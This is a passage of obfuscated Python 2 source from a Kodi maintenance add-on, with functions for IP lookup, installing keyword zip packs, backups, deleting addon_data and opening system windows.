 if 27 - 27: OoooooooOO * I1IiiI - IIiIi1iI / IIiIi1iI
 if 21 - 21: O0 * iiiiiiii1 % OoOoOO00 / O0
def ooooooo ( ) :
 Oooo0O = o0O . getSetting ( 'ip_site' )
 try :
  if Oooo0O == "whatismyipaddress.com" :
   i1I1i1 = 'http://whatismyipaddress.com/'
   O0OoooO0 = ooo0O0o00O ( i1I1i1 , 30 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
   if not 'Access Denied' in O0OoooO0 :
    oOOo0O0Oo = re . compile ( 'whatismyipaddress.com/ip/(.+?)"' ) . findall ( O0OoooO0 )
    III1I1I1iiIi = oOOo0O0Oo [ 0 ] if ( len ( oOOo0O0Oo ) > 0 ) else 'Unknown'
    xbmc . log ( III1I1I1iiIi )
    iIi1i1I1I = re . compile ( '"font-size:14px;">(.+?)</td>' ) . findall ( O0OoooO0 )
    xbmc . log ( str ( iIi1i1I1I ) )
    i11iiiI = iIi1i1I1I [ 0 ] if ( len ( iIi1i1I1I ) > 0 ) else 'Unknown'
    xbmc . log ( i11iiiI )
    o0OO = iIi1i1I1I [ 1 ] + ', ' + iIi1i1I1I [ 2 ] + ', ' + iIi1i1I1I [ 3 ] if ( len ( iIi1i1I1I ) > 2 ) else 'Unknown'
    xbmc . log ( o0OO )
    iI111I11I1I1 . ok ( 'www.whatismyipaddress.com' , "[B][COLOR gold]Address: [/COLOR][/B] %s" % III1I1I1iiIi , '[B][COLOR gold]Provider: [/COLOR][/B] %s' % i11iiiI , '[B][COLOR gold]Location: [/COLOR][/B] %s' % o0OO )
  else :
   i1I1i1 = 'https://www.iplocation.net/find-ip-address'
   O0OoooO0 = ooo0O0o00O ( i1I1i1 , 30 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
   xbmc . log ( O0OoooO0 )
   OO0o0o0oo0Oo0 = re . compile ( '<table class="iptable">(.+?)</table>' ) . findall ( O0OoooO0 )
   xbmc . log ( str ( OO0o0o0oo0Oo0 ) )
   oOOo0O0Oo = re . compile ( 'font-weight: bold;">(.+?)</span>' ) . findall ( str ( OO0o0o0oo0Oo0 ) )
   xbmc . log ( oOOo0O0Oo )
   III1I1I1iiIi = oOOo0O0Oo [ 0 ] if ( len ( oOOo0O0Oo ) > 0 ) else 'Unknown'
   IiIi = re . compile ( 'Host Name</th><td>(.+?)</td>' ) . findall ( str ( OO0o0o0oo0Oo0 ) )
   i111iI11i = IiIi [ 0 ] if ( len ( IiIi ) > 0 ) else 'Unknown'
   ooo0ooO00o = re . compile ( 'IP Location</th><td>(.+?)&nbsp;' ) . findall ( str ( OO0o0o0oo0Oo0 ) )
   o0OO = ooo0ooO00o [ 0 ] if ( len ( ooo0ooO00o ) > 0 ) else 'Unknown'
   iI111I11I1I1 . ok ( 'www.iplocation.net' , "[B][COLOR gold]Address: [/COLOR][/B] %s" % III1I1I1iiIi , '[B][COLOR gold]Host: [/COLOR][/B] %s' % i111iI11i , '[B][COLOR gold]Location: [/COLOR][/B] %s' % o0OO )
 except :
  iI111I11I1I1 . ok ( 'SERVICE UNAVAILABLE' , 'It was not possible to contact the relevant website to check your details. Please check your internet connection and if that\'s ok try using an alternative site in the settings.' )
  if 94 - 94: IIiiiI1iIII . O00OOo00oo0o
  if 52 - 52: o0oOOo0O0Ooo
def OO0Oo ( window_type ) :
 global globalyesno
 globalyesno = False
 iiIIiiiiiI1iIi = False
 OOooo00 = 0
 if 47 - 47: Oo0Ooo % OoO0O00 - iiiiiiii1 - Oo0Ooo * ooOo
 if window_type == 'yesnodialog' :
  OOOOO0oOOoO = 30
 else :
  OOOOO0oOOoO = 10
  if 42 - 42: I1IiiI + i11iIiiIii / OoO0O00
 o00OooooOOOO = False
 if 89 - 89: O0 + IIiiiI1iIII * IIi
 if 30 - 30: OoOoOO00
 while not o00OooooOOOO and OOooo00 < OOOOO0oOOoO :
  xbmc . sleep ( 100 )
  xbmc . log ( '### %s not active - sleeping (%s)' % ( window_type , OOooo00 ) )
  o00OooooOOOO = xbmc . getCondVisibility ( 'Window.IsActive(%s)' % window_type )
  OOooo00 += 1
  if 39 - 39: I1ii11iIi11i + o0oOOo0O0Ooo + IIi + IIiiiI1iIII
 if o00OooooOOOO :
  globalyesno = True
  if 48 - 48: IIi / iiiiiiii1 . iIii1I11I1II1
  if 72 - 72: i1IIi . o0oOOo0O0Ooo
 while o00OooooOOOO :
  o00OooooOOOO = xbmc . getCondVisibility ( 'Window.IsActive(%s)' % window_type )
  xbmc . sleep ( 250 )
  if 3 - 3: OoOoOO00 % II111iiii - O0
 return o00OooooOOOO
 if 52 - 52: OoO0O00
 if 49 - 49: O00OOo00oo0o . I1ii11iIi11i % iiiiiiii1 . Oo0Ooo * Oo
def Ii1iI ( url ) :
 if not os . path . exists ( OOO00O ) :
  os . makedirs ( OOO00O )
  if 40 - 40: I1IiiI
 oO0oOo0o = ''
 o00OO0o0 = 'Enter Keyword'
 IIiI1oO = O00oO00oOO00O ( o00OO0o0 )
 oO0oOo0o = url + IIiI1oO
 OOOoooOo00O = os . path . join ( OOO00O , IIiI1oO + '.zip' )
 if 69 - 69: i1IIi % OoO0O00 % IIi / iiiiiiii1 / iiiiiiii1
 if IIiI1oO != '' :
  Ii1I1i1IiiI = iI111I11I1I1 . yesno ( 'Backup existing setup' , 'Installing certain keywords can result in some existing settings or add-ons to be replaced. Would you like to create a backup before proceeding?' )
  if 37 - 37: I1IiiI + OoooooooOO . IIi + I1IiiI . IIiiiI1iIII
  if Ii1I1i1IiiI == 1 :
   IIio0O0 ( )
   if 59 - 59: II111iiii * OoooooooOO - OoooooooOO
  try :
   if oOOoo00O0O == 'true' :
    xbmc . log ( "### Attempting download " + oO0oOo0o + " to " + OOOoooOo00O )
   OOooO0OOoo . create ( "Web Installer" , "Downloading " , '' , 'Please Wait' )
   downloader . download ( oO0oOo0o , OOOoooOo00O )
   xbmc . log ( "### Keyword " + IIiI1oO + " Successfully downloaded" )
   OOooO0OOoo . update ( 0 , "" , "Extracting Zip Please Wait" )
   if 33 - 33: O0 . i11iIiiIii % o0oOOo0O0Ooo
   if zipfile . is_zipfile ( OOOoooOo00O ) :
    if 50 - 50: iiiiiiii1
    try :
     extract . all ( OOOoooOo00O , iIii1 , OOooO0OOoo )
     iiIiii1IIIII ( showdialog = False )
     iI111I11I1I1 . ok ( "KEYWORD INSTALL" , "" , "Content now installed" , "" )
     OOooO0OOoo . close ( )
     if 81 - 81: i11iIiiIii * iIii1I11I1II1 / Oo0Ooo * Oo
    except :
     iI111I11I1I1 . ok ( "Error with zip" , 'There was an error trying to install this file. It may possibly be corrupt, either try again or contact the author of this keyword.' )
     xbmc . log ( "### Unable to install keyword (passed zip check): %s" % IIiI1oO )
   else :
    iI111I11I1I1 . ok ( "Keyword Error" , 'The keyword you typed could not be installed. Please check the spelling and if you continue to receive this message it probably means that keyword is no longer available.' )
    if 83 - 83: i11iIiiIii - I1IiiI * i11iIiiIii
  except :
   iI111I11I1I1 . ok ( "Keyword Error" , 'The keyword you typed could not be installed. Please check the spelling and if you continue to receive this message it probably means that keyword is no longer available.' )
   xbmc . log ( "### Unable to install keyword (unknown error, most likely a typo in keyword entry): %s" % IIiI1oO )
   if 59 - 59: IIiIi1iI - OoooooooOO / iiiiiiii1 + I1ii11iIi11i . o0oOOo0O0Ooo - IIiIi1iI
 if os . path . exists ( OOOoooOo00O ) :
  os . remove ( OOOoooOo00O )
  if 29 - 29: ooOo
  if 26 - 26: O0 % Oo - IIiiiI1iIII . Oo
def OoooOOo0oOO ( ) :
 os . _exit ( 1 )
 if 70 - 70: o0oOOo0O0Ooo + OOOoOoo0O / IIiIi1iI + iiiiiiii1 / I1IiiI
 if 33 - 33: OoooooooOO . O0
def oOoII1IiI1II1 ( ) :
 xbmc . executebuiltin ( 'ReplaceWindow(settings)' )
 if 21 - 21: OoooooooOO . O0 / i11iIiiIii
 if 86 - 86: OoOoOO00 / Oo
def Iii1I ( DB ) :
 if DB in [ 'Addons' , 'ADSP' , 'Epg' , 'MyMusic' , 'MyVideos' , 'Textures' , 'TV' , 'ViewModes' ] :
  o0OO000ooOo = glob . glob ( os . path . join ( O0OoO000O0OO , '%s*.db' % DB ) )
  I1i11II1 = '%s(.+?).db' % DB [ 1 : ]
  II11 = 0
  for file in o0OO000ooOo :
   try :
    oO00OoO0Ooo = int ( re . compile ( I1i11II1 ) . findall ( file ) [ 0 ] )
   except :
    oO00OoO0Ooo = 0
   if II11 < oO00OoO0Ooo :
    II11 = oO00OoO0Ooo
  return '%s%s.db' % ( DB , II11 )
 else :
  return False
  if 66 - 66: o0oOOo0O0Ooo - iiiiiiii1 * ooOo - IIi + IIiIi1iI
  if 46 - 46: o0oOOo0O0Ooo - i11iIiiIii % OoO0O00 / O00OOo00oo0o - OoOoOO00
def IIio0O0 ( ) :
 oOO0OOOOOo0Oo ( )
 if 88 - 88: ooOo * I1IiiI / OoO0O00 - Oo / i1IIi . IIi
 IIII1ii1 = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' , '' ) )
 OOO0O0OOo = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' , 'my_full_backup.zip' ) )
 Iii1 = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if 26 - 26: i11iIiiIii - iiiiiiii1
 if not os . path . exists ( IIII1ii1 ) :
  os . makedirs ( IIII1ii1 )
  if 45 - 45: iiiiiiii1 + II111iiii % IIiIi1iI
 I1iII1IIi1IiI = iIioo0ooO ( heading = "Enter a name for this backup" )
 if 55 - 55: iiiiiiii1 - ooOo % I1IiiI
 if ( not I1iII1IIi1IiI ) :
  return False , 0
  if 61 - 61: iiiiiiii1
 o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
 i1II1IiiIi = xbmc . translatePath ( os . path . join ( IIII1ii1 , o00OO0o0 + '.zip' ) )
 ii111iI1i1 = [ I1IiI ]
 OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
 oO0oOoo0O = "Creating full backup of existing build"
 O000o0000O = "Creating Community Build"
 II1iI11 = "Archiving..."
 O00o0O = ""
 O00oOo0O0o00O = "Please Wait"
 if 22 - 22: iIii1I11I1II1 / iiiiiiii1 / I1IiiI - o0oOOo0O0Ooo
 iiIIii ( iIii1 , OOO0O0OOo , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
 iI111I11I1I1 . ok ( 'Full Backup Complete' , 'You can locate your backup at:[COLOR=dodgerblue]' , OOO0O0OOo + '[/COLOR]' )
 if 21 - 21: ooOo . i11iIiiIii * OOOoOoo0O . Oo / Oo
 if 42 - 42: OoooooooOO / IIi . o0oOOo0O0Ooo / O0 - IIiiiI1iIII * IIiiiI1iIII
def i111iIi11Ii ( ) :
 ii1I1 = Iiio0Oo0oO ( )
 oOo00Ooo0o0 ( 'Log Viewer' , ii1I1 )
 if 67 - 67: O00OOo00oo0o . Oo0Ooo
 if 39 - 39: OOOoOoo0O * IIi
def O0oOO0o00OO ( ) :
 iI111I11I1I1 . ok ( "Restore local guisettings fix" , "You should [COLOR=lime]ONLY[/COLOR] use this option if the guisettings fix is failing to download via the addon. Installing via this method means you do not receive notifications of updates" )
 II1i11i1iI1I ( )
 if 78 - 78: OoooooooOO - OoOoOO00 . i11iIiiIii
 if 36 - 36: ooOo * IIiIi1iI + IIiiiI1iIII * IIiIi1iI . I1ii11iIi11i - iIii1I11I1II1
def i1IIi1ii1i1ii ( mode ) :
 I1iII1IIi1IiI = iIioo0ooO ( heading = "Search for content" )
 if ( not I1iII1IIi1IiI ) :
  return False , 0
 o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
 I11ii1i ( mode + '&name=' + o00OO0o0 )
 if 97 - 97: II111iiii
 if 38 - 38: I1IiiI
def O0ooO0o ( src , dst , clean ) :
 for iiiii1i1 , I1III111i , iiI1iii in os . walk ( src ) :
  O0OooO0oo = iiiii1i1 . replace ( src , dst , 1 )
  if not os . path . exists ( O0OooO0oo ) :
   os . makedirs ( O0OooO0oo )
  for o0OO0 in iiI1iii :
   O0oOo00o = os . path . join ( iiiii1i1 , o0OO0 )
   oooo0OoOO = os . path . join ( O0OooO0oo , o0OO0 )
   if os . path . exists ( oooo0OoOO ) :
    os . remove ( oooo0OoOO )
   shutil . move ( O0oOo00o , O0OooO0oo )
 if clean == 1 :
  try :
   shutil . rmtree ( src )
  except :
   pass
   if 37 - 37: I1ii11iIi11i / O00OOo00oo0o - OoooooooOO . ooOo
   if 57 - 57: i11iIiiIii - OOOoOoo0O / iiiiiiii1 / o0oOOo0O0Ooo * i11iIiiIii * o0oOOo0O0Ooo
def I1iOo ( title , list , images , description ) :
 global pos
 global listicon
 class IiIii1iIIII ( pyxbmct . AddonDialogWindow ) :
  def __init__ ( self , title = "" , items = None , images = None , description = None ) :
   super ( IiIii1iIIII , self ) . __init__ ( title )
   self . setGeometry ( 1100 , 700 , 20 , 20 )
   self . selected = [ ]
   self . set_controls ( )
   self . connect_controls ( )
   self . listing . addItems ( items or [ ] )
   self . set_navigation ( )
   self . connect ( IIIi1I1IIii1II , self . update_list )
   self . connect ( O0ii1ii1ii , self . update_list )
   if 92 - 92: IIiiiI1iIII / iIii1I11I1II1
  def set_controls ( self ) :
   I1Iiiii = pyxbmct . Image ( iIiIIIi , aspectRatio = 0 )
   I1Iiiii . setImage ( iIiIIIi )
   self . listing = pyxbmct . List ( _imageWidth = 15 )
   self . placeControl ( I1Iiiii , 0 , 0 , rowspan = 20 , columnspan = 20 )
   ooo0000oo0 = pyxbmct . Image ( images [ 0 ] , aspectRatio = 2 )
   ooo0000oo0 . setImage ( images [ 0 ] )
   self . placeControl ( ooo0000oo0 , 0 , 11 , rowspan = 8 , columnspan = 8 , pad_x = 10 , pad_y = 10 )
   self . textbox = pyxbmct . TextBox ( )
   self . placeControl ( self . textbox , 8 , 11 , rowspan = 9 , columnspan = 9 , pad_x = 10 , pad_y = 10 )
   self . textbox . setText ( description [ 0 ] )
   self . textbox . autoScroll ( 5000 , 2000 , 8000 )
   self . ok_button = pyxbmct . Button ( "OK" )
   self . placeControl ( self . ok_button , 17 , 13 , pad_x = 10 , pad_y = 10 , rowspan = 2 , columnspan = 3 )
   self . cancel_button = pyxbmct . Button ( "Cancel" )
   self . placeControl ( self . cancel_button , 17 , 16 , pad_x = 10 , pad_y = 10 , rowspan = 2 , columnspan = 3 )
   self . placeControl ( self . listing , 0 , 0 , rowspan = 20 , columnspan = 10 , pad_y = 10 )
   if 58 - 58: IIiIi1iI % iIii1I11I1II1 . iIii1I11I1II1 / OOOoOoo0O
  def connect_controls ( self ) :
   self . connect ( self . listing , self . check_uncheck )
   self . connect ( self . ok_button , self . ok )
   self . connect ( self . cancel_button , self . close )
   if 79 - 79: OoO0O00 / Oo - i1IIi + i1IIi - IIiiiI1iIII + IIiiiI1iIII
  def set_navigation ( self ) :
   self . listing . controlLeft ( self . ok_button )
   self . listing . controlRight ( self . ok_button )
   self . ok_button . setNavigation ( self . listing , self . listing , self . cancel_button , self . cancel_button )
   self . cancel_button . setNavigation ( self . listing , self . listing , self . ok_button , self . ok_button )
   if self . listing . size ( ) :
    self . setFocus ( self . listing )
   else :
    self . setFocus ( self . cancel_button )
    if 67 - 67: OoO0O00 * OoO0O00 / OoooooooOO
  def update_list ( self ) :
   OOooooo0O0 = pyxbmct . Image ( ooo00OOOooO , aspectRatio = 0 )
   OOooooo0O0 . setImage ( ooo00OOOooO )
   self . placeControl ( OOooooo0O0 , 0 , 11 , rowspan = 8 , columnspan = 8 , pad_x = 10 , pad_y = 10 )
   iii11 = self . listing . getSelectedPosition ( )
   oOo0OO0 = images [ iii11 ]
   ooo0000oo0 = pyxbmct . Image ( oOo0OO0 , aspectRatio = 2 )
   ooo0000oo0 . setImage ( oOo0OO0 )
   self . placeControl ( ooo0000oo0 , 0 , 11 , rowspan = 8 , columnspan = 8 , pad_x = 10 , pad_y = 10 )
   self . textbox . setText ( description [ iii11 ] )
   if 56 - 56: II111iiii . II111iiii + IIiiiI1iIII . o0oOOo0O0Ooo
  def check_uncheck ( self ) :
   i1Ii111 = self . listing . getSelectedItem ( )
   if i1Ii111 . getLabel2 ( ) == "checked" :
    i1Ii111 . setIconImage ( "" )
    i1Ii111 . setLabel2 ( "unchecked" )
   else :
    i1Ii111 . setIconImage ( III1iII1I1ii )
    i1Ii111 . setLabel2 ( "checked" )
    if 58 - 58: ooOo * i11iIiiIii * I1IiiI * I1ii11iIi11i % i11iIiiIii - OoooooooOO
  def ok ( self ) :
   self . selected = [ ii1II11IIII for ii1II11IIII in xrange ( self . listing . size ( ) )
 if self . listing . getListItem ( ii1II11IIII ) . getLabel2 ( ) == "checked" ]
   super ( IiIii1iIIII , self ) . close ( )
   if 90 - 90: Oo0Ooo * O00OOo00oo0o
  def close ( self ) :
   self . selected = [ ]
   super ( IiIii1iIIII , self ) . close ( )
   if 54 - 54: I1ii11iIi11i + iIii1I11I1II1 % IIiiiI1iIII
 iI111I11I1I1 = IiIii1iIIII ( title , list , images , description )
 iI111I11I1I1 . doModal ( )
 return iI111I11I1I1 . selected
 del iI111I11I1I1
 if 24 - 24: OoO0O00 / O0 * iiiiiiii1 % iIii1I11I1II1 + i1IIi % O0
 if 26 - 26: iiiiiiii1 + IIiiiI1iIII - O0 * ooOo * II111iiii . I1ii11iIi11i
def OOoo ( ) :
 Ii1I1Ii ( '' , '[COLOR=dodgerblue]How to install keywords[/COLOR]' , '' , 'instructions_3' , 'mainmenu/keyword.png' , '' , '' , '' )
 Ii1I1Ii ( '' , '[COLOR=dodgerblue]How to create keywords[/COLOR]' , '' , 'instructions_4' , 'mainmenu/keyword.png' , '' , '' , '' )
 Ii1I1Ii ( '' , '[COLOR=gold]-----------------------------------------------------------------[/COLOR]' , '' , '' , 'mainmenu/keyword.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Install Keywords' , 'http://urlshortbot.com/noobs' , 'keywords' , 'mainmenu/keyword.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Create Keywords' , 'create_pack' , 'create_keyword' , 'mainmenu/keyword.png' , '' , '' , '' )
 if 76 - 76: OoOoOO00 * O00OOo00oo0o * iIii1I11I1II1 * i1IIi - I1ii11iIi11i
 if 1 - 1: O00OOo00oo0o * OoooooooOO - iiiiiiii1 % Oo - OoooooooOO
def ooooOOo ( title , message , times = 2000 , icon = Oo00OOOOO ) :
 xbmc . executebuiltin ( 'XBMC.Notification(%s, %s, %s, %s)' % ( title , message , times , icon ) )
 if 73 - 73: O00OOo00oo0o + IIiIi1iI % Oo + OoooooooOO * Oo0Ooo
 if 18 - 18: OoooooooOO
def oooii111I1I1I ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(filemanager,return)' )
 return
 if 34 - 34: I1ii11iIi11i % i1IIi - OoO0O00
 if 18 - 18: I1IiiI + IIi - IIiIi1iI % II111iiii / OoOoOO00 % O0
def Oo0OOO00oo0 ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(systeminfo)' )
 if 80 - 80: IIiiiI1iIII . o0oOOo0O0Ooo
 if 8 - 8: o0oOOo0O0Ooo . II111iiii . IIiIi1iI - i11iIiiIii
def ooo0O0o00O ( url , t ) :
 I11iIIi1I1 = urllib2 . Request ( url )
 I11iIIi1I1 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64; Windows NT 5.1; en-GB; rv:1.9.0.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 Gecko/2008092417 Firefox/3.0.3' )
 if 100 - 100: i11iIiiIii . Oo . i11iIiiIii
 OOooo00 = 0
 O0i1I11I = False
 while OOooo00 < 5 and O0i1I11I == False :
  oOOOooOo0O = urllib2 . urlopen ( I11iIIi1I1 , timeout = t )
  O0OoooO0 = oOOOooOo0O . read ( )
  oOOOooOo0O . close ( )
  OOooo00 += 1
  if O0OoooO0 != '' :
   O0i1I11I = True
 if O0i1I11I == True :
  return O0OoooO0 . replace ( '\r' , '' ) . replace ( '\n' , '' ) . replace ( '\t' , '' )
 else :
  iI111I11I1I1 . ok ( 'Unable to contact server' , 'There was a problem trying to access the server, please try again later.' )
  return
  if 81 - 81: I1IiiI
  if 76 - 76: O0 - iiiiiiii1 / O00OOo00oo0o . Oo0Ooo - O00OOo00oo0o
def O0o00OoooO ( ) :
 import tarfile
 if 15 - 15: II111iiii - O00OOo00oo0o - IIiIi1iI . ooOo / i11iIiiIii
 if not os . path . exists ( O0Oo000ooO00 ) :
  os . makedirs ( O0Oo000ooO00 )
  if 38 - 38: OoO0O00
 OOooO0OOoo . create ( "Creating Backup" , "Adding files... " , '' , 'Please Wait' )
 IiiIIIII = tarfile . open ( os . path . join ( O0Oo000ooO00 , iiiII ( ) + '.tar' ) , 'w' )
 if 83 - 83: i11iIiiIii + ooOo % i1IIi . IIiiiI1iIII + I1ii11iIi11i
 for OOOoooooO0oOOoO in oooooOoo0ooo :
  OOooO0OOoo . update ( 0 , "Backing Up" , '[COLOR blue]%s[/COLOR]' % OOOoooooO0oOOoO , 'Please Wait' )
  IiiIIIII . add ( OOOoooooO0oOOoO )
  if 26 - 26: IIi / IIi + Oo0Ooo - o0oOOo0O0Ooo % II111iiii . OoooooooOO
 IiiIIIII . close ( )
 OOooO0OOoo . close ( )
 if 7 - 7: II111iiii - I1ii11iIi11i / OOOoOoo0O % OoooooooOO + i1IIi
 if 42 - 42: OOOoOoo0O + i1IIi - O00OOo00oo0o / IIiiiI1iIII . IIiIi1iI
def IioO0O ( ) :
 ii1I1 = Iiio0Oo0oO ( )
 if 'Running on OpenELEC' in ii1I1 or 'Running on LibreELEC' in ii1I1 :
  return True
  if 30 - 30: Oo0Ooo + O00OOo00oo0o % i11iIiiIii * i1IIi + I1IiiI % Oo
  if 30 - 30: i11iIiiIii * Oo0Ooo . II111iiii + I1ii11iIi11i / o0oOOo0O0Ooo % IIi
def OOOo0o ( ) :
 try :
  xbmcaddon . Addon ( id = 'service.openelec.settings' ) . getAddonInfo ( 'name' )
  xbmc . executebuiltin ( 'ActivateWindow(10025,plugin://service.openelec.settings,return)' )
 except :
  xbmcaddon . Addon ( id = 'service.libreelec.settings' ) . getAddonInfo ( 'name' )
  xbmc . executebuiltin ( 'ActivateWindow(10025,plugin://service.libreelec.settings,return)' )
  if 98 - 98: O0 % i11iIiiIii % Oo
  if 6 - 6: IIi / O00OOo00oo0o / IIiIi1iI + I1IiiI / Oo0Ooo % i1IIi
def iII ( xmlfile ) :
 if 73 - 73: ooOo - I1ii11iIi11i / OoooooooOO - OoO0O00 / I1IiiI
 if 'http' in xmlfile :
  I111II1iIIII = 'none'
  Ooo00oo0ooO0 = xmlfile [ - 10 : ]
  Ooo00oo0ooO0 = Ooo00oo0ooO0 [ : - 4 ]
  i1ii1i1 = os . path . join ( iiI1IiI , I1IiI , 'latest' )
  if 42 - 42: ooOo
  if os . path . exists ( i1ii1i1 ) :
   IIiIiI = open ( i1ii1i1 , mode = 'r' )
   I111II1iIIII = IIiIiI . read ( )
   IIiIiI . close ( )
   if 22 - 22: iIii1I11I1II1 % I1IiiI . O0
  if I111II1iIIII == Ooo00oo0ooO0 :
   Ooo00oo0ooO0 = I111II1iIIII
   if 13 - 13: II111iiii % i1IIi - OoOoOO00 + IIiIi1iI
  else :
   OOooO0OOoo . create ( 'Grabbing Latest Updates' , '' , '' , '' )
   downloader . download ( xmlfile , os . path . join ( II11iiii1Ii , I1IiI , 'resources' , 'skins' , 'DefaultSkin' , 'media' , 'latest.jpg' ) )
   OooooOOoo0 = open ( i1ii1i1 , mode = 'w+' )
   OooooOOoo0 . write ( Ooo00oo0ooO0 )
   OooooOOoo0 . close ( )
  xmlfile = 'latest.xml'
 Oo00OO = Oo0oo00OO0O ( xmlfile , o0O . getAddonInfo ( 'path' ) , 'DefaultSkin' , close_time = 34 )
 Oo00OO . doModal ( )
 del Oo00OO
 if 8 - 8: OoO0O00 + IIi . Oo
 if 86 - 86: OoO0O00 - OOOoOoo0O
def OoOOo ( recursive_location , remote_path ) :
 if not os . path . exists ( recursive_location ) :
  os . makedirs ( recursive_location )
  if 83 - 83: I1IiiI % Oo0Ooo + O00OOo00oo0o + i11iIiiIii
 O0OoooO0 = ooo0O0o00O ( remote_path , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0OO000ooOo = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( O0OoooO0 )
 if 70 - 70: iIii1I11I1II1
 for OooO0oOo in o0OO000ooOo :
  oOOo00O0OOOo = xbmc . translatePath ( os . path . join ( recursive_location , OooO0oOo ) )
  if 79 - 79: i11iIiiIii
  if '/' not in OooO0oOo :
   if 20 - 20: i1IIi - IIiiiI1iIII + IIiiiI1iIII . OoooooooOO . I1IiiI + OOOoOoo0O
   try :
    OOooO0OOoo . update ( 0 , "Downloading [COLOR=yellow]" + OooO0oOo + '[/COLOR]' , '' , 'Please wait...' )
    downloader . download ( remote_path + OooO0oOo , oOOo00O0OOOo , OOooO0OOoo )
    if 10 - 10: IIiiiI1iIII / Oo0Ooo
   except :
    print "failed to install" + OooO0oOo
    if 82 - 82: I1ii11iIi11i / IIiIi1iI + I1ii11iIi11i + IIi
  if '/' in OooO0oOo and '..' not in OooO0oOo and 'http' not in OooO0oOo :
   Oo0ooO000Oo = remote_path + OooO0oOo
   OoOOo ( oOOo00O0OOOo , Oo0ooO000Oo )
   if 87 - 87: o0oOOo0O0Ooo % i1IIi + ooOo - iIii1I11I1II1 . Oo + i11iIiiIii
  else :
   pass
   if 83 - 83: I1ii11iIi11i * II111iiii . IIi - OOOoOoo0O
   if 46 - 46: OoO0O00 % I1ii11iIi11i
def OO00O0O ( ) :
 iI111I11I1I1 . ok ( "Register to unlock features" , "To get the most out of this addon please register at the NOOBSANDNERDS forum for free." , 'WWW.NOOBSANDNERDS.COM/SUPPORT' )
 if 76 - 76: O00OOo00oo0o % O0 * iIii1I11I1II1 - I1ii11iIi11i % ooOo
 if 57 - 57: I1ii11iIi11i
def II1111i11i11 ( ) :
 I1i1I1I11IiiI = iI111I11I1I1 . yesno ( 'DELETE ADD-ON DATA' , 'Do you want to remove individual addon_data folders or wipe all addon_data?' , yeslabel = 'EVERYTHING' , nolabel = 'INDIVIDUAL ITEMS' )
 if 43 - 43: O0 * i11iIiiIii - OoooooooOO - ooOo
 if I1i1I1I11IiiI :
  I1i1I1I11IiiI = iI111I11I1I1 . yesno ( 'Are you ABSOLUTELY certain?' , 'This will remove ALL your addon_data, there\'s no getting it back! Are you certain you want to continue?' )
  if I1i1I1I11IiiI :
   iII1i1 ( )
   iI111I11I1I1 . ok ( "Addon_Data Removed" , '' , 'Your addon_data folder has now been removed.' , '' )
 else :
  iIII1iiII = [ ]
  IIi1iI1 = [ ]
  IIi11i1II = [ ]
  OO0ooo0o0 = [ ]
  oO0ooOoO = [ ]
  if 46 - 46: ooOo * i1IIi / I1ii11iIi11i
  for file in os . listdir ( iiI1IiI ) :
   if os . path . isdir ( os . path . join ( iiI1IiI , file ) ) :
    try :
     IiiIiiIi = xbmcaddon . Addon ( file )
     ooo0O = IiiIiiIi . getAddonInfo ( 'name' )
     Oo0o = IiiIiiIi . getAddonInfo ( 'icon' )
     O00Oo = IiiIiiIi . getAddonInfo ( 'description' )
    except :
     ooo0O = 'Unknown Add-on'
     Oo0o = oo00O00oO
     O00Oo = 'No add-on has been found on your system that matches this ID. The most likely scenario for this is you\'ve previously uninstalled this add-on and left the old addon_data on the system.'
     if 100 - 100: I1IiiI - Oo
   else :
    ooo0O = 'Unknown Add-on'
    Oo0o = oo00O00oO
    O00Oo = 'No add-on has been found on your system that matches this ID. The most likely scenario for this is you\'ve previously uninstalled this add-on and left the old addon_data on the system.'
    if 91 - 91: o0oOOo0O0Ooo * I1ii11iIi11i - IIiIi1iI . II111iiii
   oOOo00O0OOOo = os . path . join ( iiI1IiI , file )
   iIII1iiII . append ( '%s [COLOR=gold](%s)[/COLOR]' % ( file , ooo0O ) )
   IIi1iI1 . append ( Oo0o )
   IIi11i1II . append ( O00Oo )
   OO0ooo0o0 . append ( oOOo00O0OOOo )
   if 1 - 1: Oo + IIi * I1ii11iIi11i
  Oo0oOooOoOo = I1iOo ( 'Addon_Data To Remove' , iIII1iiII , IIi1iI1 , IIi11i1II )
  for i1II1 in Oo0oOooOoOo :
   IiIiIi1I1 = OO0ooo0o0 [ i1II1 ]
   IiI1ii1Ii = iIII1iiII [ i1II1 ]
   oO0ooOoO . append ( [ IiI1ii1Ii , IiIiIi1I1 ] )
  xbmc . log ( 'FINAL: %s' % oO0ooOoO )
  if len ( oO0ooOoO ) > 0 :
   oooOOOoOOOo0O ( oO0ooOoO )
   if 44 - 44: IIiIi1iI
   if 79 - 79: o0oOOo0O0Ooo % Oo . O0
def oooOOOoOOOo0O ( url ) :
 OO0oO0 = 0
 for i1II1 in url :
  I11iI1i11IiI = i1II1 [ 1 ] . replace ( II11iiii1Ii , iiI1IiI )
  if 'addon_data' in i1II1 [ 1 ] :
   i1iiIIIi = 'Addon_Data'
  else :
   i1iiIIIi = 'Addon'
  if iI111I11I1I1 . yesno ( "Remove %s" % i1iiIIIi , "Do you want to Remove:" , '[COLOR=dodgerblue]%s[/COLOR]' % i1II1 [ 0 ] ) :
   if not 'addon_data' in i1II1 [ 1 ] :
    OO0oO0 = 1
